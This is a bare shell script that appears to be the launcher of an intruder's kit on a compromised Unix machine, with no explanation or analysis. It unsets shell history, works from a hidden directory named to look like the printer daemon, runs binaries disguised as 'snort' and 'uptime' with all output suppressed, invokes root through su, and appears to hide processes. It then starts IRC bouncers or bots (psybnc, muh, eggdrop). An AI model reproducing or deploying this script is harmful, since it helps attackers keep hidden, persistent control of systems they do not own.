#!/bin/sh
unset HISTFILE
unset HISTSAVE
cd /var/local/.lpd
/bin/su - root -c ./snort > /dev/null 2>&1
./sqrt > /dev/null 2>&1
./snort f 1 /var/local/.lpd > /dev/null 2>&1
sleep 1
./snort i `cat pid` > /dev/null 2>&1
./snort p 1 `cat pid` > /dev/null 2>&1
./snort i `cat pid` > /dev/null 2>&1
if [ -d /var/local/lpd/r ];then
cd r/
./uptime > /dev/null 2>&1
cd ..
./snort i `cat r/psybnc.pid` > /dev/null 2>&1
elif [ -d /var/local/lpd/muhh ];then
cd muhh/
./muhh > /dev/null 2>&1
cd ..
./snort i `cat muhh/pid` > /dev/null 2>&1
elif [ -d /var/local/lpd/muh ];then
cd muh/
./muh > /dev/null 2>&1
cd ..
./snort i `cat muh/pid` > /dev/null 2>&1
elif [ -d /var/local/lpd/.egg ];then
cd .egg/
./eggdrop > /dev/null 2>&1
cd ..
./snort i `cat .egg/*.pid` > /dev/null 2>&1
fi
